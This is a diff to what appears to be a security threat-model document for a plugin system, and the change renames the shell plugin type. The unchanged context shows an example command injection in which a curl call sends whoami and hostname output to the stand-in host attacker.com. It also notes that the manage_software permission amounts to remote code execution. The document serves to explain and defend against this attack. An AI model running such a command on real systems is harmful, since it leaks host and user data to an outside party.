@@ -10,7 +10,7 @@
 ## Attack description
 
 1. An attacker with `manage_software` API access creates a plugin config with a
-   plugin type that supports arbitrary shell commands (e.g., `generic_shell`).
+   plugin type that supports arbitrary shell commands (e.g., `generic.shell`).
 2. The attacker embeds malicious bash in the `version_command` or `update_command`
    field. For example:
    `"version_command": "curl http://attacker.com/$(whoami)@$(hostname) && echo 1.0"`
@@ -67,7 +67,7 @@ The same attack applies to:
 
 ## Residual risk
 
-- **Shell plugin commands are unvalidated by design.** The `generic_shell` plugin's
+- **Shell plugin commands are unvalidated by design.** The `generic.shell` plugin's
   `version_command` and `update_command` accept any shell command. This is intentional
   (the plugin's purpose is operator-supplied scripts), but it means
   `manage_software` permission is effectively equivalent to remote code execution.
